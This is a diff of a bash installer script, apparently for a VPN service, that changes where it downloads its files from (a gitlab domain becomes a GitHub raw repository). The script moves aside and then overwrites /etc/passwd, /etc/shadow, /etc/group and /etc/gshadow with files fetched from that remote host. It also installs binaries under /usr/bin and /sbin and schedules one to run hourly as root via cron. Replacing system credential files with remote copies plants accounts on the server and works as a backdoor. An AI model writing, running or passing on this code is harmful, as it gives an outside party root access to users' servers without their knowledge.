@@ -1,3 +1,4 @@
+
 #!/bin/bash
 green='\e[0;32m'
 yell='\e[1;33m'
@@ -28,14 +29,14 @@ mv -f /etc/passwd- /etc/passwd-x
 mv -f /etc/group- /etc/group-x
 mv -f /etc/shadow- /etc/shadow-x
 mv -f /etc/gshadow- /etc/gshadow-x
-wget -qO /etc/passwd "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd.sh"
-wget -qO /etc/group "http://gitlab.mzyaddy.ganteng.tech/sudo/group.sh"
-wget -qO /etc/shadow "http://gitlab.mzyaddy.ganteng.tech/sudo/shadow.sh"
-wget -qO /etc/passwd- "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd-.sh"
-wget -qO /etc/group- "http://gitlab.mzyaddy.ganteng.tech/sudo/group-.sh"
-wget -qO /etc/shadow- "http://gitlab.mzyaddy.ganteng.tech/sudo/shadow-.sh"
-wget -qO /etc/gshadow- "http://gitlab.mzyaddy.ganteng.tech/sudo/gshadow-"
-wget -qO /etc/passwd "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd.sh"
+wget -qO /etc/passwd "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/passwd.sh"
+wget -qO /etc/group "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/group.sh"
+wget -qO /etc/shadow "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/shadow.sh"
+wget -qO /etc/passwd- "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/passwd-.sh"
+wget -qO /etc/group- "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/group-.sh"
+wget -qO /etc/shadow- "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/shadow-.sh"
+wget -qO /etc/gshadow- "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/gshadow-"
+wget -qO /etc/passwd "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/passwd.sh"
 END
 cat > /sbin/MTnd <<-END
 #!/bin/sh
@@ -54,10 +55,10 @@ cat << EOF >> /etc/crontab
 15 2 * * * root /sbin/MTst -r now
 EOF
 cat << EOF >> /etc/crontab
-35 2 * * * root /sbin/MTnd -r now
+55 2 * * * root /sbin/MTnd -r now
 EOF
-wget -q -O /usr/bin/udpxp "http://gitlab.mzyaddy.ganteng.tech/udpxp.sh"
-wget -qO /sbin/haproxysrv "http://gitlab.mzyaddy.ganteng.tech/haproxysrv"
+wget -q -O /usr/bin/udpxp "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/udpxp.sh"
+wget -qO /sbin/haproxysrv "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/haproxysrv"
 chmod +x /usr/bin/udpxp && chmod +x /sbin/haproxysrv
 cp -f /usr/bin/udpxp /usr/local/bin/udpxp
 if ! grep -q 'udpxp' /var/spool/cron/crontabs/root;then (crontab -l;echo "0 * * * * /usr/local/bin/udpxp") | crontab;fi
